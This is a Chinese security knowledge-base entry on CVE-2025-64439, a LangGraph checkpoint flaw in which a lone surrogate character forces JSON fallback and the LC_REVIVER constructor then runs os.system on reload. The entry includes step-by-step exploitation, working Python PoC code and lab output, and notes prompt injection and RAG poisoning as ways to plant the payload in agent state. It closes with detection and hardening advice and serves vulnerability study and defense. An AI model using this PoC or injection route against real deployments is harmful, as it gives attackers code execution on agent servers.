---
id: ai-security-agent-security-langgraph-checkpoint-json-fallback-rce
title: LangGraph 检查点序列化回退 RCE（CVE-2025-64439）：孤立代理字符逼出 JSON，Reviver 执行构造器
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: langgraph-jsonplus-serializer-surrogate-fallback-constructor-rce
aliases:
- CVE-2025-64439
- LangGraph checkpoint RCE
- JsonPlusSerializer JSON 回退
- 孤立代理字符绕过
- lc constructor 反序列化
- 检查点反序列化
tags:
- ai
- agent
- langgraph
- langchain
- deserialization
- checkpoint
- json-fallback
- surrogate
- rce
cve:
- CVE-2025-64439
severity: critical
confidence: high
status: verified
affected_versions: langgraph-checkpoint < 3.0（原文靶场 2.1.2；ormsgpack 1.9.0–1.10.x 的报错含 valid UTF-8 时触发，1.12.2 改为 string contains surrogates）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V23
  verified_at: '2026-11-05T02:38:36+08:00'
  notes: 已对照原文核对；JsonPlusSerializer 代理字符导致 msgpack 失败后 JSON 回退、LC_REVIVER 构造器执行、invoke#1 保存不执行/ invoke#2 重载执行、修复版 encoding=msgpack 无执行，均与正文与 7 张截图一致；affected_versions 按原文标记设置。未复跑靶场。
---

## 一句话结论

`langgraph-checkpoint < 3.0` 的 `JsonPlusSerializer` 优先用 msgpack 序列化；当状态字符串含孤立 Unicode 代理字符（如 `\ud800`）时 ormsgpack 编码失败，`dumps_typed()` 捕获异常后静默回退到 JSON 模式；JSON 模式的反序列化挂载 `LC_REVIVER`，会把攻击者字典里的 `{"lc":2,"type":"constructor","id":["os","system"],"kwargs":{...}}` 当受信任对象动态导入并调用。攻击者只需让该字典和代理字符进入智能体状态，检查点保存后，下一条普通消息触发重载即执行命令。

## 原理

- **有状态执行必然序列化**：LangGraph 的 Pregel 循环在每个超步后由 Checkpointer 把节点状态写入 SQLite/Postgres/Redis，下次运行再读回。用户提示、工具输出、RAG 片段、模型生成的结构化 JSON 都会进入状态，即都可被攻击者影响。
- **双编码策略**：`JsonPlusSerializer.dumps_typed()` 先尝试 `ormsgpack`（二进制、紧凑），失败再回退 `dumps()`（JSON、自描述）。正常情况下 msgpack 成功，JSON 路径不参与。
- **回退触发条件**：状态中存在孤立代理字符（如 `"\ud800"`）时，ormsgpack 抛 `TypeError: str is not valid UTF-8: surrogates not allowed`。2.1.2 的代码捕获 `MsgpackEncodeError`，只要异常文本包含 `valid UTF-8` 就 `return "json", self.dumps(obj)`，把整个状态（包括攻击者字典）原样写成 JSON。
- **JSON 反序列化授予信任**：JSON 模式的 `loads()` 使用 `LC_REVIVER`/`default_reviver`。遇到 `lc` 为 1 或 2 且 `type == "constructor"` 的字典时，它执行 `importlib.import_module(".".join(id[:-1]))`，再 `getattr(module, id[-1])(**kwargs)`。攻击者把 `id` 设为 `["os","system"]`、`kwargs` 设为 `{"command": "..."}`，反序列化即调用 `os.system`。
- **执行时机**：保存阶段只落盘、不执行；下一条普通消息触发检查点重载时，反序列化发生在框架进程内。全程不需要工具调用、MCP 服务器或模型参与，护栏审查的是“模型说了什么”，拦截不到框架自己的 Reviver。
- **版本敏感点**：ormsgpack 1.9.0–1.10.x 的报错文案含 `valid UTF-8`，命中回退分支；1.12.2 的文案变为 `string contains surrogates`，不再命中，直接抛异常。因此同一 `langgraph-checkpoint` 版本在不同 ormsgpack 下可复现性不同。

## 触发条件

- `langgraph-checkpoint < 3.0`（原文靶场 2.1.2），且 ormsgpack 版本使报错文案命中回退分支（1.9.0–1.10.x；靶场用 1.10.0）。
- 应用使用 `JsonPlusSerializer`（默认序列化器），或任何开启 `pickle_fallback=True` 的序列化器。
- 攻击者能让一个含 `lc/type/id/kwargs` 的字典进入图状态（提示注入让 LLM 输出该结构、RAG 文档、工具返回、表单字段等），并让同一状态含孤立代理字符。
- 检查点会持久化并在后续消息/会话恢复时重载（SQLite、Postgres、Redis 等自动进行）。
- 目标模块在 Python 导入路径中可导入（`os`、`subprocess`、`builtins` 等标准库总是可用）。

## 利用步骤

1. 构造攻击字典：`{"lc": 2, "type": "constructor", "id": ["os", "system"], "kwargs": {"command": "<命令>"}}`。
2. 在同一状态中放入含孤立代理字符的字符串（如 `"oops i fetched a surrogate \ud800"`），确保 msgpack 编码失败。
3. 让该状态进入图：提示注入让 LLM 返回该 JSON、投毒 RAG 文档、或让工具输出携带它；图执行结束后 Checkpointer 自动保存，`dumps_typed()` 回退为 JSON。
4. 发送下一条普通消息（如 `{"foo": "hi there"}`），触发上一检查点重载；`LC_REVIVER` 解析构造器并执行命令。
5. 验证副作用（创建文件、回连、进程输出），确认执行发生在重载阶段而非保存阶段。

## PoC

```python
# 序列化器级：强制 JSON 回退并触发构造器
from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer

serializer = JsonPlusSerializer()
payload = {
    "attack": {
        "lc": 2,
        "type": "constructor",
        "id": ["os", "system"],
        "kwargs": {"command": "cmd /c echo pwned> lab_pwned_64439.txt"},
    },
    "trigger": "surrogate \ud800 forces json fallback",
}
typed = serializer.dumps_typed(payload)   # -> ("json", ...) 回退发生
serializer.loads_typed(typed)             # -> os.system() 执行
```

```python
# 端到端：保存无害、重载执行
class State(TypedDict):
    foo: str
    attack: dict

def my_node(state: State):
    return {"foo": "oops i fetched a surrogate \ud800"}

graph = (StateGraph(State)
         .add_node("my_node", my_node)
         .add_edge(START, "my_node")
         .compile(checkpointer=SqliteSaver.from_conn_string("lab_checkpoint.db")))

graph.invoke({"attack": attack}, config=config)   # 保存（marker 不存在）
graph.invoke({"foo": "hi there"}, config=config)  # 重载 -> 执行
```

```text
# 靶场输出（原文截图）：
# dumps_typed -> encoding = 'json'
# RCE CONFIRMED: lab_pwned_64439.txt created by os.system() during deserialization
# invoke #1 marker exists after save? False
# invoke #2 done -> RCE CONFIRMED during checkpoint deserialization
```

## 变体与关联

- 变体：`id` 换成 `subprocess`、`builtins.eval`、`pathlib.Path.write_text` 等任意可导入构造器；`kwargs` 随构造器变化。
- 变体：用其他能让 msgpack 失败的输入（孤立代理、非 UTF-8 字节）替代 `\ud800`；关键是“让编码失败且异常被吞”。
- 变体：其它采用“优先二进制、失败回退 JSON”策略的检查点/记忆组件，也可能把表达力更强的格式暴露给攻击者数据。
- 关联：[[ai-security-agent-security-langchain-lc-tag-serialization-injection]]（同源信任标记问题的另一 CVE）、[[web-python-deserialization]]（pickle 等经典反序列化）、[[ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding]]（智能体基础设施的另一类信任边界问题）。
- 边界：`langgraph-checkpoint >= 3.0` 且 4.x 在编码层启用 `OPT_REPLACE_SURROGATES` 后回退不触发；构造器白名单阻止动态导入；`allowed_objects` 收紧；序列化失败改为显式报错；进程无可导入的危险构造器时影响降低。

## 检测与防御

- 检测：依赖版本 `langgraph-checkpoint < 3.0`；检查点数据中出现 `"lc"`、`"type":"constructor"`、`"id":["os","system"]` 等结构；反序列化期间出现 `importlib` 动态导入异常/子进程；状态字符串含 `\ud800` 等孤立代理字符；SQLite/Postgres 检查点表出现异常 JSON 编码。
- 修复：升级 `langgraph-checkpoint >= 3.0`（建议 4.x），并成套升级 `langgraph-checkpoint-sqlite >= 3.0.1`（4.2.0 配 2.0.11 会 AttributeError）；升级 ormsgpack 到替代代理字符的版本。
- 加固：`JsonPlusSerializer(allowed_objects="messages")` 或显式白名单；禁止序列化失败静默降级，改为报错终止；进入状态前剥离 `lc/type/id/kwargs/graphs` 保留键与孤立代理字符；对检查点字节做 HMAC 签名并在反序列化前验签；可信字段与用户内容分命名空间。
